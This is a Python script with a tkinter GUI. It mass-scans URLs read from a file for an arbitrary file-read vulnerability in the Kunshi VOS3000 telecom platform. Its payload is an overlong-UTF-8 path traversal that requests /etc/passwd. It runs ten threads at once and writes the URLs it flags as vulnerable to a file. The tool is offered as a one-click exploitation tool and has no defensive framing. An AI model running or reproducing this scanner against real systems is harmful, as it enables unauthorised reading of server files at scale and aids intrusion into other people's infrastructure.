import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def VOS3000_redfile_exp(url):
    poc = r"""/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            VOS3000_redfile_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            VOS3000_redfile_text.see(END)
            with open ("存在昆石网络 虚拟运营支撑系统任意文件读取漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            VOS3000_redfile_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            VOS3000_redfile_text.see(END)
    except Exception as err:
        VOS3000_redfile_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        VOS3000_redfile_text.see(END)
def get_VOS3000_redfile_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def VOS3000_redfile_gui():
    VOS3000_redfile = tk.Tk()
    VOS3000_redfile.geometry("910x450")
    VOS3000_redfile.title("昆石网络 虚拟运营支撑系统任意文件读取漏洞一把梭")
    VOS3000_redfile.resizable(0, 0)
    VOS3000_redfile.iconbitmap('logo.ico')
    global VOS3000_redfile_text
    VOS3000_redfile_text = scrolledtext.ScrolledText(VOS3000_redfile,width=123, height=25)
    VOS3000_redfile_text.grid(row=0, column=0, padx=10, pady=10)
    VOS3000_redfile_text.see(END)
    addrs = get_VOS3000_redfile_addr()
    max_thread_num = 10
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(VOS3000_redfile_exp, addr)
    VOS3000_redfile.mainloop()